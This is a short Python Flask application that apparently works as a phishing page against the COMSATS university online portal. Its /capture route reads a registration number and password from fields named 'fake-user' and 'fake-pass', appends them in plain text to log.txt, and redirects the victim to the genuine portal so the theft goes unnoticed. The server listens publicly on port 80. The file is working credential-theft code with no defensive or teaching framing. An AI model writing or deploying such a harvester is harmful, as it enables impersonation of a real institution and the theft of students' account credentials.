from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():

    reg_no = request.form.get('fake-user')
    password = request.form.get('fake-pass')


    with open("log.txt", "a") as f:
        f.write(f"Reg: {reg_no} | Pass: {password}\n")


    return redirect("https://cuonline.comsats.edu.pk/")

if __name__ == '__main__':
   
    app.run(host='0.0.0.0', port=80)